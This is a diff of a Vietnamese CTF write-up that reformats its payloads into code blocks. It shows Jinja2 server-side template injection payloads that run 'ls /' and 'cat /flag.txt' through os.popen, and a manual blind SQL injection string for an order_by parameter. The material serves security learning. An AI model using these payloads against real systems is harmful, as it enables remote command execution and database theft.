@@ -25,14 +25,19 @@ Test tiếp `name` = `${{<%[%'"}}%\.` để biết xem phía server đang dùng 
 
 => Jinja2
 
-Sử dụng payload: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls /').read() }}
-`
+Sử dụng payload: 
+```
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls /').read() }}
+```
 
 Phát hiện có flag.txt
 
 ![image](https://hackmd.io/_uploads/B1iApWdLyg.png)
 
-Đọc flag.txt => `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}`
+Đọc flag.txt 
+```
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
+```
 
 ![image](https://hackmd.io/_uploads/BJeI0bO8kg.png)
 
@@ -109,11 +114,17 @@ Thử `{{7*7}}` ra 49
 
 Tiếp tục 1 số bước như bài 1 => Jinja2 
 
-Và chèn payload sau: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls /').read() }}`
+Và chèn payload sau: 
+```
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls /').read() }}
+```
 
 ![image](https://hackmd.io/_uploads/ByNifMu8kg.png)
 
-Đọc flag.txt: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}`
+Đọc flag.txt: 
+```
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
+```
 
 ![image](https://hackmd.io/_uploads/S1xpfMOLJx.png)
 
@@ -131,8 +142,10 @@ Sử dụng sqlmap check 1 số database
 
 => xem xét db `chh`
 
-**Note**: 1 cách test bằng cơm nếu không dùng sqlmap: `?order_by=(SELECT (CASE WHEN ((SELECT substring(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)='a') THEN 'price' ELSE (SELECT 7066 UNION SELECT 7211) END))
-`
+**Note**: 1 cách test bằng cơm nếu không dùng sqlmap: 
+```
+?order_by=(SELECT (CASE WHEN ((SELECT substring(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)='a') THEN 'price' ELSE (SELECT 7066 UNION SELECT 7211) END))
+```
 
 Phát hiện table flag
 
